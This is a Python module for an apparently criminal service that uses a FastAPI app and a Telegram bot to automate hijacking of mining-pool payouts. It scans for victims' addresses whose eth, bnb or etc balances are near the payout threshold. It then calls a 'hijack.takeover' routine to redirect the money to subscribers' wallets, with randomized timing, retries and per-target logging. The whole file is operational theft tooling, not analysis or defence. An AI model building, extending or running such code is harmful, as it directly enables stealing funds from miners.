"""High-cadence pass. Only targets already at payout threshold, so money moves now.

Also the web/bot host: owns the FastAPI app, the aiogram dispatcher, and
the scan loop via lifespan. Polling mode (webhook deleted on start).
"""

from __future__ import annotations

import asyncio
import logging
import os
import random
import time
from contextlib import asynccontextmanager

from aiogram import Bot, Dispatcher
from fastapi import FastAPI

from . import commands, db, hijack
from .pools import by_id, takeoverable

log = logging.getLogger(__name__)

INTERVAL = 45
REASSERT_FAST = 20 * 60
FAIL_COOL = 10 * 60
TAKE = 5
CONC = 3

BOT_TOKEN = os.environ["BOT_TOKEN"]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
dp.include_router(commands.router)


async def pass_once():
    for u in db.all("SELECT * FROM users WHERE active=1 AND auto=1"):
        if not u["evm"]:
            continue
        now = int(time.time())
        rows = db.all(
            """SELECT t.*, c.state, c.ts AS cts FROM targets t
               LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
               WHERE t.coin IN ('eth','bnb','etc') AND t.usd >= ?
                 AND t.threshold > 0 AND t.balance >= t.threshold * 0.95
                 AND (c.state IS NULL
                      OR (c.state='fail' AND c.ts < ?)
                      OR (c.state='ok' AND c.ts < ?))
               ORDER BY t.score DESC LIMIT ?""",
            (
                u["tg_id"],
                u["min_usd"],
                now - FAIL_COOL,
                now - REASSERT_FAST,
                TAKE,
            ),
        )
        sem = asyncio.Semaphore(CONC)

        async def one(t):
            spec = by_id(t["pool"])
            if not takeoverable(spec):
                return
            async with sem:
                state, note = await hijack.takeover(
                    spec, t["address"], u["evm"], lambda m: db.log(m, u["tg_id"])
                )
                db.run(
                    """INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
                       ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
                       ts=excluded.ts, note=excluded.note""",
                    (u["tg_id"], t["id"], state, int(time.time()), note),
                )
                db.log(
                    f"fast {t['pool']} {t['address'][:10]} -> {state}: {note}",
                    u["tg_id"],
                    "ok" if state == "ok" else "warn",
                )
                await asyncio.sleep(random.uniform(0.5, 1.5))

        await asyncio.gather(*[one(t) for t in rows])


async def loop():
    await asyncio.sleep(20)
    while True:
        try:
            if db.one("SELECT 1 FROM users WHERE active=1 AND auto=1 LIMIT 1"):
                await pass_once()
        except Exception as e:
            db.log(f"fastpath {type(e).__name__}: {e}", lvl="error")
        await asyncio.sleep(INTERVAL + random.randint(0, 10))


@asynccontextmanager
async def lifespan(_app: FastAPI):
    await bot.delete_webhook(drop_pending_updates=True)
    scan = asyncio.create_task(loop())
    polling = asyncio.create_task(dp.start_polling(bot))
    log.info("fastpath up: polling + scan loop started")
    try:
        yield
    finally:
        await dp.stop_polling()
        polling.cancel()
        scan.cancel()
        await bot.session.close()
        log.info("fastpath down")


app = FastAPI(lifespan=lifespan)